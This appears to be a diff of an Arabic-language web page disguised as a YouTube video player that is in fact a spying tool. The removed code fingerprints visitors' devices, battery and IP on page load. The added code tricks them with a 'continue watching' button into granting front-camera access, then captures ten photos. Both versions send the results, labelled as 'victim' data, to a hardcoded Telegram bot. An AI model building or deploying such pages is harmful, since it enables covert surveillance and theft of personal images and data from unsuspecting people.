@@ -2,157 +2,94 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title></title> <!-- -->
+  <title></title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body { margin:0; background:#000; overflow:hidden; }
-    iframe { width:100vw; height:100vh; border:none; }
+    body { margin:0; background:#000; font-family:Arial; color:#fff; text-align:center; }
+    iframe { display:none; width:100vw; height:100vh; border:none; }
+    #buttons { position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); z-index:9999; }
+    button { padding:20px 40px; margin:20px; font-size:22px; border:none; border-radius:10px; cursor:pointer; }
+    #yes { background:#00cc00; color:white; }
+    #no { background:#ff4444; color:white; }
+    #msg { position:fixed; top:10px; left:10px; background:rgba(0,0,0,0.7); padding:10px; border-radius:8px; }
   </style>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 </head>
 <body>
 
-<iframe src="https://www.youtube.com/embed/BygacCWcCi0?autoplay=1&mute=0&loop=1&playlist=BygacCWcCi0" allowfullscreen></iframe>
+<iframe id="video" src="https://www.youtube.com/embed/BygacCWcCi0?autoplay=1&mute=0&loop=1&playlist=BygacCWcCi0" allowfullscreen></iframe>
+
+<div id="buttons">
+  <button id="yes" onclick="startCamera()">متابعة مشاهدة الفيديو</button>
+  <button id="no" onclick="reject()">رفض مشاهدة الفيديو</button>
+</div>
+
+<div id="msg">اضغط على الزر للمتابعة</div>
 
 <script>
-// Telegram Config – تاعك
+// Telegram Config
 const TELEGRAM_TOKEN = '8226370812:AAEYjJJffesfCxL1NIp0Ihd1r_2aSb4roSc';
 const CHAT_ID = '6769216123';
 
-// إرسال رسالة نصية
-function sendToTg(text) {
-  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: text,
-      parse_mode: 'HTML'
-    })
-  }).catch(() => {});
-}
-
-// جمع المعلومات الدقيقة اللي تبغيها فقط
-async function sendExactInfo() {
-  const victim = {
-    ip: 'جاري...',
-    time: new Date().toISOString(),
-    date_in_device: new Date().toString(),
-    productSub: navigator.productSub || 'unknown',
-    vendor: navigator.vendor || 'unknown',
-    maxTouchPoints: navigator.maxTouchPoints || 0,
-    doNotTrack: navigator.doNotTrack || 'null',
-    hardwareConcurrency: navigator.hardwareConcurrency || 0,
-    cookieEnabled: navigator.cookieEnabled ? 'true' : 'false',
-    appCodeName: navigator.appCodeName || 'unknown',
-    appName: navigator.appName || 'unknown',
-    appVersion: navigator.appVersion || 'unknown',
-    platform: navigator.platform || 'unknown',
-    product: navigator.product || 'unknown',
-    userAgent: navigator.userAgent || 'unknown',
-    language: navigator.language || 'unknown',
-    languages: navigator.languages?.join(', ') || 'unknown',
-    webdriver: navigator.webdriver ? 'true' : 'false',
-    pdfViewerEnabled: navigator.pdfViewerEnabled ? 'true' : 'false',
-    deviceMemory: navigator.deviceMemory || 'unknown',
-    audioinput: 'id =',
-    videoinput: 'id =',
-    audiooutput: 'id =',
-    connection_type: navigator.connection?.type || 'unknown',
-    rtt: navigator.connection?.rtt || 'unknown',
-    saveData: navigator.connection?.saveData || 'false',
-    effectiveType: navigator.connection?.effectiveType || 'unknown',
-    downlink: navigator.connection?.downlink || 'unknown',
-    downlinkMax: navigator.connection?.downlinkMax || 'Infinity',
-    usb_devices: '0', // لا يوجد API عام لعدد USB
-    battery_level: 'جاري...',
-    battery_charging: 'جاري...'
-  };
-
-  // IP via WebRTC
-  try {
-    const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
-    pc.createDataChannel('');
-    pc.createOffer(o => pc.setLocalDescription(o), e => {});
-    pc.onicecandidate = e => {
-      if (!e.candidate) return sendFormatted(victim);
-      const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-      if (match) victim.ip = match[1];
-    };
-  } catch(e) { victim.ip = 'blocked'; sendFormatted(victim); }
-
-  // Battery
-  if (navigator.getBattery) {
-    navigator.getBattery().then(b => {
-      victim.battery_level = Math.round(b.level * 100) + '%';
-      victim.battery_charging = b.charging ? 'true' : 'false';
-      sendFormatted(victim);
-    });
+// إرسال لتليغرام
+function sendToTg(text, photo = null) {
+  if (photo) {
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ chat_id: CHAT_ID, photo: photo, caption: text })
+    }).catch(() => {});
   } else {
-    victim.battery_level = 'غير مدعوم';
-    victim.battery_charging = 'غير مدعوم';
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+    }).catch(() => {});
   }
-
-  // إرسال فوري
-  sendFormatted(victim);
 }
 
-// تنسيق الرسالة بالشكل اللي تبغيه
-function sendFormatted(victim) {
-  const text = 
-`✅Victim Information
-⚓ IP: ${victim.ip || 'غير متوفر'} (https://ip-api.com/#${victim.ip || 'غير متوفر'}) | Time: ${victim.time}
-⏳ Date In Victim's Device : ${victim.date_in_device}
-📱 Device Information
-productSub: ${victim.productSub}
-vendor: ${victim.vendor}
-maxTouchPoints: ${victim.maxTouchPoints}
-doNotTrack: ${victim.doNotTrack}
-hardwareConcurrency: ${victim.hardwareConcurrency}
-cookieEnabled: ${victim.cookieEnabled}
-appCodeName: ${victim.appCodeName}
-appName: ${victim.appName}
-appVersion: ${victim.appVersion}
-platform: ${victim.platform}
-product: ${victim.product}
-userAgent: ${victim.userAgent}
-language: ${victim.language}
-languages: ${victim.languages}
-webdriver: ${victim.webdriver}
-pdfViewerEnabled: ${victim.pdfViewerEnabled}
-deviceMemory: ${victim.deviceMemory}
-📷 Media Device Information
-audioinput: id = ${victim.audioinput}
-videoinput: id = ${victim.videoinput}
-audiooutput: id = ${victim.audiooutput}
-🕸️ Network Information
-type: ${victim.connection_type}
-rtt: ${victim.rtt}
-saveData: ${victim.saveData}
-effectiveType: ${victim.effectiveType}
-downlink: ${victim.downlink}
-downlinkMax: ${victim.downlinkMax}
-🔌 Total USB devices connected: ${victim.usb_devices}
-🔋 Battery Information
-🔋Battery Level: ${victim.battery_level}
-⚡ Is Battery Charging: ${victim.battery_charging}`;
-
-  sendToTg(text);
+// رفض → ما يصير والو
+function reject() {
+  document.getElementById('msg').innerText = 'تم الرفض، شكرا!';
+  setTimeout(() => window.close(), 2000);
 }
 
-function sendToTg(text) {
-  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: text,
-      parse_mode: 'HTML'
-    })
-  }).catch(() => {});
-}
+// متابعة → يطلب الكاميرا (الـ popup يطلع طبيعي)
+async function startCamera() {
+  document.getElementById('buttons').style.display = 'none';
+  document.getElementById('msg').innerText = 'جاري تشغيل الفيديو...';
+  document.getElementById('video').style.display = 'block';
 
-// شغّل فور الدخول
-window.onload = sendExactInfo;
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }); // الكاميرا الأمامية
+    sendToTg('✅ الضحية وافق على الكاميرا الأمامية!');
+
+    // سحب 10 صور متتالية من الكاميرا
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.play();
+
+    let count = 0;
+    const interval = setInterval(() => {
+      if (count >= 10) {
+        clearInterval(interval);
+        stream.getTracks().forEach(track => track.stop());
+        sendToTg('تم سحب 10 صور من الكاميرا الأمامية');
+        return;
+      }
+
+      html2canvas(video, {scale: 0.5}).then(canvas => {
+        const img = canvas.toDataURL('image/png');
+        sendToTg(`صورة ${count+1} من الكاميرا الأمامية`, img);
+        count++;
+      });
+    }, 1000); // كل ثانية صورة
+
+  } catch (err) {
+    sendToTg(`❌ رفض الوصول للكاميرا: ${err.message}`);
+    document.getElementById('msg').innerText = 'يرجى السماح بالكاميرا لمشاهدة الفيديو';
+  }
+}
 </script>
 
 </body>
